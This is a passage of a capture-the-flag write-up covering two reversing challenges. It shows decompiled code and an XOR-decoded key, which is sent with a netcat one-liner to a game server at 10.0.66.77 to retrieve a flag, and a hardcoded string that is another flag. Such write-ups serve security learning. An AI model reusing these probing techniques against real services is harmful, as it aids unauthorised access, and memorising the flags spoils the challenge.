class="c0"><span>if(!strncmp(buf, &quot;KEYREQ&quot;, 6)){</span></p><p class="c0"><span>&nbsp; //connect to 10.0.66.77:11112</span></p><p class="c0"><span>&nbsp; //xor &quot;\x28\x30\x2b\x21\x20\x22\x40\x23\xd0\x3a\x20\x18\x25\x31\x3c\x20\x2b\x51\x9c\xed\xd2\x7f&quot; with repeated-xor key &quot;KEYREQ&quot;</span></p><p class="c0"><span>&nbsp; //(the result will be &quot;cursesOfTheIntern\x00\xD7\xA8\x8B-&quot;)</span></p><p class="c0"><span>&nbsp; //send it and get the flag</span></p><p class="c0"><span>}</span></p><p class="c0"><span>---</span></p><p class="c0"><span>I did the same thing using netcat...</span></p><p class="c0"><span>---</span></p><p class="c0"><span>$ python -c &#39;print &quot;cursesOfTheIntern\x00\xD7\xA8\x8B-&quot;,&#39; | nc 10.0.66.77 11112</span></p><p class="c0"><span>theBankIsAlwaysRightButAreTheTellers</span></p><p class="c0"><span>---</span></p><p class="c0"><span>... and got the flag for &quot;blackSmoke - highLow&quot;</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>theBankIsAlwaysRightButAreTheTellers</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.qxjkvpfdweom"></a><span>14. Banishing of the Holy Angel 1 (exploitation,binary,reversing,pwnable 200)</span></h1><p class="c0 c2"><span></span></p><p class="c0"><span>This challenge uses the same binary with &quot;blackSmoke - highLow&quot;.</span></p><p class="c0"><span>Let&#39;s continue reversing to get another flag.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>In the code we received in Step 1, I found this code:</span></p><p class="c0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcat(char_array, &quot;deKebra&quot;);</span></p><p class="c0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcat(char_array, &quot;YUhackM&quot;);</span></p><p class="c0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcat(char_array, &quot;ahwarde&quot;);</span></p><p class="c0"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcat(char_array, &quot;nlikeSHYYT&quot;);</span></p><p class="c0"><span>It builds a strange string(&quot;deKebraYUhackMahwardenlikeSHYYT&quot;), but this string isn&#39;t used anywhere, so I submitted it to the scoreboard, and got 200 points :)</span></p><p class="c0"><span>This string was the flag for &quot;Banishing of the Holy Angel 1&quot;.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>deKebraYUhackMahwardenlikeSHYYT</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p></body></html>